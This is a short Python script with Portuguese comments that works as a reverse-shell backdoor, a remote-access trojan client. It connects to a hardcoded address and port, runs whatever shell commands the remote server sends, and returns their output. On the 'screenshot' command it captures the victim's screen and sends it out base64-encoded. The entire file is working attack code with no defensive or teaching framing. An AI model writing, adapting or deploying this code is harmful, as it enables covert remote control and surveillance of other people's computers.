import socket
import subprocess
import base64
from io import BytesIO
from PIL import ImageGrab

def capturar_tela():
    screenshot = ImageGrab.grab()
    buffer = BytesIO()
    screenshot.save(buffer, format="PNG")  # Salva no buffer como PNG
    return base64.b64encode(buffer.getvalue()).decode()  # Converte para base64

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('10.137.73.36', 6783))  # Conectando ao servidor

while True:
    comando = client_socket.recv(1024).decode()
    
    if not comando:
        break  # Se o servidor fechar a conexão
    
    if comando.lower() == "screenshot":
        imagem_base64 = capturar_tela()
        client_socket.sendall(imagem_base64.encode())  # Envia a string base64 da imagem
    
    else:
        try:
            processo = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            saida, erro = processo.communicate()
            resposta = saida if saida else erro
            client_socket.sendall(resposta.encode())
        except Exception as e:
            client_socket.sendall(f"Erro ao executar comando: {str(e)}".encode())

client_socket.close()
